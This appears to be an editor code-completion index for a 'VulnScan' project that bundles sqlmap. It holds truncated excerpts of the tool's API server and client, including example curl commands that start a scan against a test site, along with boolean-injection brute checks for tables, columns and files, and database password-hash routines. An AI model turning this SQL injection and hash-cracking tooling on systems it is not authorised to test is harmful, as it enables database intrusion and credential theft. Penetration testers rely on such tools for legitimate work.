        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER, username=None, password=None):\n    \"\"\"\n    REST-JSON API server\n    \"\"\"\n    DataStore.admin_token = encodeHex(os.urandom(16), binary=False)\n    DataStore.username = username\n    DataStore.password = password\n    _, Database.filepath = tempfile.mkstemp(prefix=MKSTEMP_PREFIX.IPC, text=False)\n    os.close(_)\n    if port == 0:  # random",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "client",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.api",
        "description": "VulnScan.modules.sqlmap.lib.utils.api",
        "peekOfCode": "def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, username=None, password=None):\n    \"\"\"\n    REST-JSON API client\n    \"\"\"\n    DataStore.username = username\n    DataStore.password = password\n    dbgMsg = \"Example client access from command line:\"\n    dbgMsg += \"\\n\\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\\\\{16\\\\}') && echo $taskid\" % (host, port)\n    dbgMsg += \"\\n\\t$ curl -H \\\"Content-Type: application/json\\\" -X POST -d '{\\\"url\\\": \\\"http://testphp.vulnweb.com/artists.php?artist=1\\\"}' http://%s:%d/scan/$taskid/start\" % (host, port)\n    dbgMsg += \"\\n\\t$ curl http://%s:%d/scan/$taskid/data\" % (host, port)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.api",
        "documentation": {}
    },
    {
        "label": "tableExists",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.brute",
        "description": "VulnScan.modules.sqlmap.lib.utils.brute",
        "peekOfCode": "def tableExists(tableFile, regex=None):\n    if kb.choices.tableExists is None and not any(_ for _ in kb.injection.data if _ not in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)) and not conf.direct:\n        warnMsg = \"it's not recommended to use '%s' and/or '%s' \" % (PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.TIME], PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.STACKED])\n        warnMsg += \"for common table existence check\"\n        logger.warning(warnMsg)\n        message = \"are you sure you want to continue? [y/N] \"\n        kb.choices.tableExists = readInput(message, default='N', boolean=True)\n        if not kb.choices.tableExists:\n            return None\n    result = inject.checkBooleanExpression(\"%s\" % safeStringFormat(BRUTE_TABLE_EXISTS_TEMPLATE, (randomInt(1), randomStr())))",
        "detail": "VulnScan.modules.sqlmap.lib.utils.brute",
        "documentation": {}
    },
    {
        "label": "columnExists",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.brute",
        "description": "VulnScan.modules.sqlmap.lib.utils.brute",
        "peekOfCode": "def columnExists(columnFile, regex=None):\n    if kb.choices.columnExists is None and not any(_ for _ in kb.injection.data if _ not in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)) and not conf.direct:\n        warnMsg = \"it's not recommended to use '%s' and/or '%s' \" % (PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.TIME], PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.STACKED])\n        warnMsg += \"for common column existence check\"\n        logger.warning(warnMsg)\n        message = \"are you sure you want to continue? [y/N] \"\n        kb.choices.columnExists = readInput(message, default='N', boolean=True)\n        if not kb.choices.columnExists:\n            return None\n    if not conf.tbl:",
        "detail": "VulnScan.modules.sqlmap.lib.utils.brute",
        "documentation": {}
    },
    {
        "label": "fileExists",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.brute",
        "description": "VulnScan.modules.sqlmap.lib.utils.brute",
        "peekOfCode": "def fileExists(pathFile):\n    retVal = []\n    message = \"which common files file do you want to use?\\n\"\n    message += \"[1] default '%s' (press Enter)\\n\" % pathFile\n    message += \"[2] custom\"\n    choice = readInput(message, default='1')\n    if choice == '2':\n        message = \"what's the custom common files file location?\\n\"\n        pathFile = readInput(message) or pathFile\n    infoMsg = \"checking files existence using items from '%s'\" % pathFile",
        "detail": "VulnScan.modules.sqlmap.lib.utils.brute",
        "documentation": {}
    },
    {
        "label": "crawl",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.crawler",
        "description": "VulnScan.modules.sqlmap.lib.utils.crawler",
        "peekOfCode": "def crawl(target, post=None, cookie=None):\n    if not target:\n        return\n    try:\n        visited = set()\n        threadData = getCurrentThreadData()\n        threadData.shared.value = OrderedSet()\n        threadData.shared.formsFound = False\n        def crawlThread():\n            threadData = getCurrentThreadData()",
        "detail": "VulnScan.modules.sqlmap.lib.utils.crawler",
        "documentation": {}
    },
    {
        "label": "storeResultsToFile",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.crawler",
        "description": "VulnScan.modules.sqlmap.lib.utils.crawler",
        "peekOfCode": "def storeResultsToFile(results):\n    if not results:\n        return\n    if kb.storeCrawlingChoice is None:\n        message = \"do you want to store crawling results to a temporary file \"\n        message += \"for eventual further processing with other tools [y/N] \"\n        kb.storeCrawlingChoice = readInput(message, default='N', boolean=True)\n    if kb.storeCrawlingChoice:\n        handle, filename = tempfile.mkstemp(prefix=MKSTEMP_PREFIX.CRAWLER, suffix=\".csv\" if conf.forms else \".txt\")\n        os.close(handle)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.crawler",
        "documentation": {}
    },
    {
        "label": "checkDependencies",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.deps",
        "description": "VulnScan.modules.sqlmap.lib.utils.deps",
        "peekOfCode": "def checkDependencies():\n    missing_libraries = set()\n    for dbmsName, data in DBMS_DICT.items():\n        if data[1] is None:\n            continue\n        try:\n            if dbmsName in (DBMS.MSSQL, DBMS.SYBASE):\n                __import__(\"_mssql\")\n                pymssql = __import__(\"pymssql\")\n                if not hasattr(pymssql, \"__version__\") or pymssql.__version__ < \"1.0.2\":",
        "detail": "VulnScan.modules.sqlmap.lib.utils.deps",
        "documentation": {}
    },
    {
        "label": "_Getch",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.getch",
        "description": "VulnScan.modules.sqlmap.lib.utils.getch",
        "peekOfCode": "class _Getch(object):\n    \"\"\"\n    Gets a single character from standard input.  Does not echo to\n    the screen (reference: http://code.activestate.com/recipes/134892/)\n    \"\"\"\n    def __init__(self):\n        try:\n            self.impl = _GetchWindows()\n        except ImportError:\n            try:",
        "detail": "VulnScan.modules.sqlmap.lib.utils.getch",
        "documentation": {}
    },
    {
        "label": "_GetchUnix",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.getch",
        "description": "VulnScan.modules.sqlmap.lib.utils.getch",
        "peekOfCode": "class _GetchUnix(object):\n    def __init__(self):\n        __import__(\"tty\")\n    def __call__(self):\n        import sys\n        import termios\n        import tty\n        fd = sys.stdin.fileno()\n        old_settings = termios.tcgetattr(fd)\n        try:",
        "detail": "VulnScan.modules.sqlmap.lib.utils.getch",
        "documentation": {}
    },
    {
        "label": "_GetchWindows",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.getch",
        "description": "VulnScan.modules.sqlmap.lib.utils.getch",
        "peekOfCode": "class _GetchWindows(object):\n    def __init__(self):\n        __import__(\"msvcrt\")\n    def __call__(self):\n        import msvcrt\n        return msvcrt.getch()\nclass _GetchMacCarbon(object):\n    \"\"\"\n    A function which returns the current ASCII key that is down;\n    if no ASCII key is down, the null string is returned.  The",
        "detail": "VulnScan.modules.sqlmap.lib.utils.getch",
        "documentation": {}
    },
    {
        "label": "_GetchMacCarbon",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.getch",
        "description": "VulnScan.modules.sqlmap.lib.utils.getch",
        "peekOfCode": "class _GetchMacCarbon(object):\n    \"\"\"\n    A function which returns the current ASCII key that is down;\n    if no ASCII key is down, the null string is returned.  The\n    page http://www.mactech.com/macintosh-c/chap02-1.html was\n    very helpful in figuring out how to do this.\n    \"\"\"\n    def __init__(self):\n        import Carbon\n        getattr(Carbon, \"Evt\")  # see if it has this (in Unix, it doesn't)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.getch",
        "documentation": {}
    },
    {
        "label": "getch",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.getch",
        "description": "VulnScan.modules.sqlmap.lib.utils.getch",
        "peekOfCode": "getch = _Getch()",
        "detail": "VulnScan.modules.sqlmap.lib.utils.getch",
        "documentation": {}
    },
    {
        "label": "HTTPCollectorFactory",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.har",
        "description": "VulnScan.modules.sqlmap.lib.utils.har",
        "peekOfCode": "class HTTPCollectorFactory(object):\n    def __init__(self, harFile=False):\n        self.harFile = harFile\n    def create(self):\n        return HTTPCollector()\nclass HTTPCollector(object):\n    def __init__(self):\n        self.messages = BigArray()\n        self.extendedArguments = {}\n    def setExtendedArguments(self, arguments):",
        "detail": "VulnScan.modules.sqlmap.lib.utils.har",
        "documentation": {}
    },
    {
        "label": "HTTPCollector",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.har",
        "description": "VulnScan.modules.sqlmap.lib.utils.har",
        "peekOfCode": "class HTTPCollector(object):\n    def __init__(self):\n        self.messages = BigArray()\n        self.extendedArguments = {}\n    def setExtendedArguments(self, arguments):\n        self.extendedArguments = arguments\n    def collectRequest(self, requestMessage, responseMessage, startTime=None, endTime=None):\n        self.messages.append(RawPair(requestMessage, responseMessage,\n                                     startTime=startTime, endTime=endTime,\n                                     extendedArguments=self.extendedArguments))",
        "detail": "VulnScan.modules.sqlmap.lib.utils.har",
        "documentation": {}
    },
    {
        "label": "RawPair",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.har",
        "description": "VulnScan.modules.sqlmap.lib.utils.har",
        "peekOfCode": "class RawPair(object):\n    def __init__(self, request, response, startTime=None, endTime=None, extendedArguments=None):\n        self.request = getBytes(request)\n        self.response = getBytes(response)\n        self.startTime = startTime\n        self.endTime = endTime\n        self.extendedArguments = extendedArguments or {}\n    def toEntry(self):\n        return Entry(request=Request.parse(self.request), response=Response.parse(self.response),\n                     startTime=self.startTime, endTime=self.endTime,",
        "detail": "VulnScan.modules.sqlmap.lib.utils.har",
        "documentation": {}
    },
    {
        "label": "Entry",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.har",
        "description": "VulnScan.modules.sqlmap.lib.utils.har",
        "peekOfCode": "class Entry(object):\n    def __init__(self, request, response, startTime, endTime, extendedArguments):\n        self.request = request\n        self.response = response\n        self.startTime = startTime or 0\n        self.endTime = endTime or 0\n        self.extendedArguments = extendedArguments\n    def toDict(self):\n        out = {\n            \"request\": self.request.toDict(),",
        "detail": "VulnScan.modules.sqlmap.lib.utils.har",
        "documentation": {}
    },
    {
        "label": "Request",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.har",
        "description": "VulnScan.modules.sqlmap.lib.utils.har",
        "peekOfCode": "class Request(object):\n    def __init__(self, method, path, httpVersion, headers, postBody=None, raw=None, comment=None):\n        self.method = method\n        self.path = path\n        self.httpVersion = httpVersion\n        self.headers = headers or {}\n        self.postBody = postBody\n        self.comment = comment.strip() if comment else comment\n        self.raw = raw\n    @classmethod",
        "detail": "VulnScan.modules.sqlmap.lib.utils.har",
        "documentation": {}
    },
    {
        "label": "Response",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.har",
        "description": "VulnScan.modules.sqlmap.lib.utils.har",
        "peekOfCode": "class Response(object):\n    extract_status = re.compile(b'\\\\((\\\\d{3}) (.*)\\\\)')\n    def __init__(self, httpVersion, status, statusText, headers, content, raw=None, comment=None):\n        self.raw = raw\n        self.httpVersion = httpVersion\n        self.status = status\n        self.statusText = statusText\n        self.headers = headers\n        self.content = content\n        self.comment = comment.strip() if comment else comment",
        "detail": "VulnScan.modules.sqlmap.lib.utils.har",
        "documentation": {}
    },
    {
        "label": "FakeSocket",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.har",
        "description": "VulnScan.modules.sqlmap.lib.utils.har",
        "peekOfCode": "class FakeSocket(object):\n    # Original source:\n    # https://stackoverflow.com/questions/24728088/python-parse-http-response-string\n    def __init__(self, response_text):\n        self._file = io.BytesIO(response_text)\n    def makefile(self, *args, **kwargs):\n        return self._file\nclass HTTPRequest(_BaseHTTPServer.BaseHTTPRequestHandler):\n    # Original source:\n    # https://stackoverflow.com/questions/4685217/parse-raw-http-headers",
        "detail": "VulnScan.modules.sqlmap.lib.utils.har",
        "documentation": {}
    },
    {
        "label": "HTTPRequest",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.har",
        "description": "VulnScan.modules.sqlmap.lib.utils.har",
        "peekOfCode": "class HTTPRequest(_BaseHTTPServer.BaseHTTPRequestHandler):\n    # Original source:\n    # https://stackoverflow.com/questions/4685217/parse-raw-http-headers\n    def __init__(self, request_text):\n        self.comment = None\n        self.rfile = io.BytesIO(request_text)\n        self.raw_requestline = self.rfile.readline()\n        if self.raw_requestline.startswith(b\"HTTP request [\"):\n            self.comment = self.raw_requestline\n            self.raw_requestline = self.rfile.readline()",
        "detail": "VulnScan.modules.sqlmap.lib.utils.har",
        "documentation": {}
    },
    {
        "label": "mysql_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def mysql_passwd(password, uppercase=True):\n    \"\"\"\n    Reference(s):\n        https://web.archive.org/web/20120215205312/http://csl.sublevel3.org/mysql-password-function/\n    >>> mysql_passwd(password='testpass', uppercase=True)\n    '*00E247AC5F9AF26AE0194B41E1E769DEE1429A29'\n    \"\"\"\n    password = getBytes(password)\n    retVal = \"*%s\" % sha1(sha1(password).digest()).hexdigest()\n    return retVal.upper() if uppercase else retVal.lower()",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "mysql_old_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def mysql_old_passwd(password, uppercase=True):  # prior to version '4.1'\n    \"\"\"\n    Reference(s):\n        https://web.archive.org/web/20091205000600/http://www.sfr-fresh.com/unix/privat/tpop3d-1.5.5.tar.gz:a/tpop3d-1.5.5/password.c\n        https://github.com/pwnieexpress/pwn_plug_sources/blob/master/src/darkmysqli/DarkMySQLi.py\n    >>> mysql_old_passwd(password='testpass', uppercase=True)\n    '7DCDA0D57290B453'\n    \"\"\"\n    a, b, c = 1345345333, 7, 0x12345671\n    for d in password:",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "postgres_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def postgres_passwd(password, username, uppercase=False):\n    \"\"\"\n    Reference(s):\n        http://pentestmonkey.net/blog/cracking-postgres-hashes/\n    >>> postgres_passwd(password='testpass', username='testuser', uppercase=False)\n    'md599e5ea7a6f7c3269995cba3927fd0093'\n    \"\"\"\n    username = getBytes(username)\n    password = getBytes(password)\n    retVal = \"md5%s\" % md5(password + username).hexdigest()",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "mssql_new_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def mssql_new_passwd(password, salt, uppercase=False):  # since version '2012'\n    \"\"\"\n    Reference(s):\n        http://hashcat.net/forum/thread-1474.html\n        https://sqlity.net/en/2460/sql-password-hash/\n    >>> mssql_new_passwd(password='testpass', salt='4086ceb6', uppercase=False)\n    '0x02004086ceb6eb051cdbc5bdae68ffc66c918d4977e592f6bdfc2b444a7214f71fa31c35902c5b7ae773ed5f4c50676d329120ace32ee6bc81c24f70711eb0fc6400e85ebf25'\n    \"\"\"\n    binsalt = decodeHex(salt)\n    unistr = b\"\".join((_.encode(UNICODE_ENCODING) + b\"\\0\") if ord(_) < 256 else _.encode(UNICODE_ENCODING) for _ in password)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "mssql_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def mssql_passwd(password, salt, uppercase=False):  # versions '2005' and '2008'\n    \"\"\"\n    Reference(s):\n        http://www.leidecker.info/projects/phrasendrescher/mssql.c\n        https://www.evilfingers.com/tools/GSAuditor.php\n    >>> mssql_passwd(password='testpass', salt='4086ceb6', uppercase=False)\n    '0x01004086ceb60c90646a8ab9889fe3ed8e5c150b5460ece8425a'\n    \"\"\"\n    binsalt = decodeHex(salt)\n    unistr = b\"\".join((_.encode(UNICODE_ENCODING) + b\"\\0\") if ord(_) < 256 else _.encode(UNICODE_ENCODING) for _ in password)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "mssql_old_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def mssql_old_passwd(password, salt, uppercase=True):  # version '2000' and before\n    \"\"\"\n    Reference(s):\n        www.exploit-db.com/download_pdf/15537/\n        http://www.leidecker.info/projects/phrasendrescher/mssql.c\n        https://www.evilfingers.com/tools/GSAuditor.php\n    >>> mssql_old_passwd(password='testpass', salt='4086ceb6', uppercase=True)\n    '0x01004086CEB60C90646A8AB9889FE3ED8E5C150B5460ECE8425AC7BB7255C0C81D79AA5D0E93D4BB077FB9A51DA0'\n    \"\"\"\n    binsalt = decodeHex(salt)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "oracle_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def oracle_passwd(password, salt, uppercase=True):\n    \"\"\"\n    Reference(s):\n        https://www.evilfingers.com/tools/GSAuditor.php\n        http://www.notesbit.com/index.php/scripts-oracle/oracle-11g-new-password-algorithm-is-revealed-by-seclistsorg/\n        http://seclists.org/bugtraq/2007/Sep/304\n    >>> oracle_passwd(password='SHAlala', salt='1B7B5F82B7235E9E182C', uppercase=True)\n    'S:2BFCFDF5895014EE9BB2B9BA067B01E0389BB5711B7B5F82B7235E9E182C'\n    \"\"\"\n    binsalt = decodeHex(salt)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "oracle_old_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def oracle_old_passwd(password, username, uppercase=True):  # prior to version '11g'\n    \"\"\"\n    Reference(s):\n        http://www.notesbit.com/index.php/scripts-oracle/oracle-11g-new-password-algorithm-is-revealed-by-seclistsorg/\n    >>> oracle_old_passwd(password='tiger', username='scott', uppercase=True)\n    'F894844C34402B67'\n    \"\"\"\n    IV, pad = b\"\\0\" * 8, b\"\\0\"\n    unistr = b\"\".join((b\"\\0\" + _.encode(UNICODE_ENCODING)) if ord(_) < 256 else _.encode(UNICODE_ENCODING) for _ in (username + password).upper())\n    if des.__module__ == \"Crypto.Cipher.DES\":",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "md5_generic_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def md5_generic_passwd(password, uppercase=False):\n    \"\"\"\n    >>> md5_generic_passwd(password='testpass', uppercase=False)\n    '179ad45c6ce2cb97cf1029e212046e81'\n    \"\"\"\n    password = getBytes(password)\n    retVal = md5(password).hexdigest()\n    return retVal.upper() if uppercase else retVal.lower()\ndef sha1_generic_passwd(password, uppercase=False):\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "sha1_generic_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def sha1_generic_passwd(password, uppercase=False):\n    \"\"\"\n    >>> sha1_generic_passwd(password='testpass', uppercase=False)\n    '206c80413b9a96c1312cc346b7d2517b84463edd'\n    \"\"\"\n    password = getBytes(password)\n    retVal = sha1(password).hexdigest()\n    return retVal.upper() if uppercase else retVal.lower()\ndef apache_sha1_passwd(password, **kwargs):\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "apache_sha1_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def apache_sha1_passwd(password, **kwargs):\n    \"\"\"\n    >>> apache_sha1_passwd(password='testpass')\n    '{SHA}IGyAQTualsExLMNGt9JRe4RGPt0='\n    \"\"\"\n    password = getBytes(password)\n    return \"{SHA}%s\" % getText(base64.b64encode(sha1(password).digest()))\ndef ssha_passwd(password, salt, **kwargs):\n    \"\"\"\n    >>> ssha_passwd(password='testpass', salt='salt')",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "ssha_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def ssha_passwd(password, salt, **kwargs):\n    \"\"\"\n    >>> ssha_passwd(password='testpass', salt='salt')\n    '{SSHA}mU1HPTvnmoXOhE4ROHP6sWfbfoRzYWx0'\n    \"\"\"\n    password = getBytes(password)\n    salt = getBytes(salt)\n    return \"{SSHA}%s\" % getText(base64.b64encode(sha1(password + salt).digest() + salt))\ndef ssha256_passwd(password, salt, **kwargs):\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "ssha256_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def ssha256_passwd(password, salt, **kwargs):\n    \"\"\"\n    >>> ssha256_passwd(password='testpass', salt='salt')\n    '{SSHA256}hhubsLrO/Aje9F/kJrgv5ZLE40UmTrVWvI7Dt6InP99zYWx0'\n    \"\"\"\n    password = getBytes(password)\n    salt = getBytes(salt)\n    return \"{SSHA256}%s\" % getText(base64.b64encode(sha256(password + salt).digest() + salt))\ndef ssha512_passwd(password, salt, **kwargs):\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "ssha512_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def ssha512_passwd(password, salt, **kwargs):\n    \"\"\"\n    >>> ssha512_passwd(password='testpass', salt='salt')\n    '{SSHA512}mCUSLfPMhXCQOJl9WHW/QMn9v9sjq7Ht/Wk7iVau8vLOfh+PeynkGMikqIE8sStFd0khdfcCD8xZmC6UyjTxsHNhbHQ='\n    \"\"\"\n    password = getBytes(password)\n    salt = getBytes(salt)\n    return \"{SSHA512}%s\" % getText(base64.b64encode(sha512(password + salt).digest() + salt))\ndef sha224_generic_passwd(password, uppercase=False):\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "sha224_generic_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def sha224_generic_passwd(password, uppercase=False):\n    \"\"\"\n    >>> sha224_generic_passwd(password='testpass', uppercase=False)\n    '648db6019764b598f75ab6b7616d2e82563a00eb1531680e19ac4c6f'\n    \"\"\"\n    retVal = sha224(getBytes(password)).hexdigest()\n    return retVal.upper() if uppercase else retVal.lower()\ndef sha256_generic_passwd(password, uppercase=False):\n    \"\"\"\n    >>> sha256_generic_passwd(password='testpass', uppercase=False)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "sha256_generic_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def sha256_generic_passwd(password, uppercase=False):\n    \"\"\"\n    >>> sha256_generic_passwd(password='testpass', uppercase=False)\n    '13d249f2cb4127b40cfa757866850278793f814ded3c587fe5889e889a7a9f6c'\n    \"\"\"\n    retVal = sha256(getBytes(password)).hexdigest()\n    return retVal.upper() if uppercase else retVal.lower()\ndef sha384_generic_passwd(password, uppercase=False):\n    \"\"\"\n    >>> sha384_generic_passwd(password='testpass', uppercase=False)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "sha384_generic_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def sha384_generic_passwd(password, uppercase=False):\n    \"\"\"\n    >>> sha384_generic_passwd(password='testpass', uppercase=False)\n    '6823546e56adf46849343be991d4b1be9b432e42ed1b4bb90635a0e4b930e49b9ca007bc3e04bf0a4e0df6f1f82769bf'\n    \"\"\"\n    retVal = sha384(getBytes(password)).hexdigest()\n    return retVal.upper() if uppercase else retVal.lower()\ndef sha512_generic_passwd(password, uppercase=False):\n    \"\"\"\n    >>> sha512_generic_passwd(password='testpass', uppercase=False)",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "sha512_generic_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def sha512_generic_passwd(password, uppercase=False):\n    \"\"\"\n    >>> sha512_generic_passwd(password='testpass', uppercase=False)\n    '78ddc8555bb1677ff5af75ba5fc02cb30bb592b0610277ae15055e189b77fe3fda496e5027a3d99ec85d54941adee1cc174b50438fdc21d82d0a79f85b58cf44'\n    \"\"\"\n    retVal = sha512(getBytes(password)).hexdigest()\n    return retVal.upper() if uppercase else retVal.lower()\ndef crypt_generic_passwd(password, salt, **kwargs):\n    \"\"\"\n    Reference(s):",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "crypt_generic_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def crypt_generic_passwd(password, salt, **kwargs):\n    \"\"\"\n    Reference(s):\n        http://docs.python.org/library/crypt.html\n        http://helpful.knobs-dials.com/index.php/Hashing_notes\n        http://php.net/manual/en/function.crypt.php\n        http://carey.geek.nz/code/python-fcrypt/\n    >>> crypt_generic_passwd(password='rasmuslerdorf', salt='rl', uppercase=False)\n    'rl.3StKT.4T8M'\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "unix_md5_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def unix_md5_passwd(password, salt, magic=\"$1$\", **kwargs):\n    \"\"\"\n    Reference(s):\n        http://www.sabren.net/code/python/crypt/md5crypt.py\n    >>> unix_md5_passwd(password='testpass', salt='aD9ZLmkp')\n    '$1$aD9ZLmkp$DRM5a7rRZGyuuOPOjTEk61'\n    \"\"\"\n    def _encode64(value, count):\n        output = \"\"\n        while (count - 1 >= 0):",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "joomla_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
        "peekOfCode": "def joomla_passwd(password, salt, **kwargs):\n    \"\"\"\n    Reference: https://stackoverflow.com/a/10428239\n    >>> joomla_passwd(password='testpass', salt='6GGlnaquVXI80b3HRmSyE3K1wEFFaBIf')\n    'e3d5794da74e917637332e0d21b76328:6GGlnaquVXI80b3HRmSyE3K1wEFFaBIf'\n    \"\"\"\n    return \"%s:%s\" % (md5(getBytes(password) + getBytes(salt)).hexdigest(), salt)\ndef django_md5_passwd(password, salt, **kwargs):\n    \"\"\"\n    Reference: https://github.com/jay0lee/GAM/blob/master/src/passlib/handlers/django.py",
        "detail": "VulnScan.modules.sqlmap.lib.utils.hash",
        "documentation": {}
    },
    {
        "label": "django_md5_passwd",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.utils.hash",
        "description": "VulnScan.modules.sqlmap.lib.utils.hash",
